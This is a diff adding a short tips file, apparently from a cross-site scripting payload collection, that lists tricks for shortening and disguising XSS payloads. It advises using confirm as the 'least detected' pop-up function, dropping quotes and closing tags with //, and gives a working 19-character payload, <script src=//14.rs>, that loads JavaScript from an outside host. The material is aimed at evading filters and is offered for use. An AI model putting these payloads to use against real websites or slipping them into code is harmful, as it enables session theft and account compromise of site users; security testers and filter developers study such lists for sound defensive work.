@@ -1,0 +1,9 @@
+Awesome Tips & Tricks
+
+http(s):// can be shortened to // or /\\ or \\.
+document.cookie can be shortened to cookie. It applies to other DOM objects as well.
+alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()
+You can use // to close a tag instead of >.
+I have found that confirm is the least detected pop-up function so stop using alert.
+Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use <script src=//14.rs> instead of <script src="//14.rs">
+The shortest independent XSS payload is script src=//14.rs (19 chars)
